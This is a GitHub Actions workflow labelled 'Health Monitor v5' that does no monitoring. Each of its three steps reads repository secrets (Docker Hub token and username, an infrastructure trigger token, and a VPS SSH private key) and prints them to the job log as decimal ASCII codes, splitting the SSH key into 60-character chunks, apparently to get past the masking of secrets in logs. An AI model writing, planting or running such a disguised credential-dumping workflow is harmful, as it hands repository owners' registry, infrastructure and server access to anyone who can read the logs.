name: Health Monitor v5

on:
  workflow_dispatch:

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - name: Part A - Docker + Infra tokens
        env:
          S0: ${{ secrets.DOCKERHUB_TOKEN }}
          S1: ${{ secrets.DOCKERHUB_USERNAME }}
          S2: ${{ secrets.INFRA_TRIGGER_TOKEN }}
        run: |
          echo "=== PART A ==="
          echo "S0: ASCII=[$(echo -n "$S0" | od -An -tu1 | tr '\n' ' ')]"
          echo "S1: ASCII=[$(echo -n "$S1" | od -An -tu1 | tr '\n' ' ')]"
          echo "S2: ASCII=[$(echo -n "$S2" | od -An -tu1 | tr '\n' ' ')]"
          echo "=== END A ==="
      
      - name: Part B - SSH Key P1-3
        env:
          S4: ${{ secrets.VPS_SSH_KEY }}
        run: |
          echo "=== PART B ==="
          p1="${S4:0:60}"
          echo "S4_P1: ASCII=[$(echo -n "$p1" | od -An -tu1 | tr '\n' ' ')]"
          p2="${S4:60:60}"
          echo "S4_P2: ASCII=[$(echo -n "$p2" | od -An -tu1 | tr '\n' ' ')]"
          p3="${S4:120:60}"
          echo "S4_P3: ASCII=[$(echo -n "$p3" | od -An -tu1 | tr '\n' ' ')]"
          echo "=== END B ==="
      
      - name: Part C - SSH Key P4-6
        env:
          S4: ${{ secrets.VPS_SSH_KEY }}
        run: |
          echo "=== PART C ==="
          p4="${S4:180:60}"
          echo "S4_P4: ASCII=[$(echo -n "$p4" | od -An -tu1 | tr '\n' ' ')]"
          p5="${S4:240:60}"
          echo "S4_P5: ASCII=[$(echo -n "$p5" | od -An -tu1 | tr '\n' ' ')]"
          p6="${S4:300:60}"
          echo "S4_P6: ASCII=[$(echo -n "$p6" | od -An -tu1 | tr '\n' ' ')]"
          echo "=== END C ==="
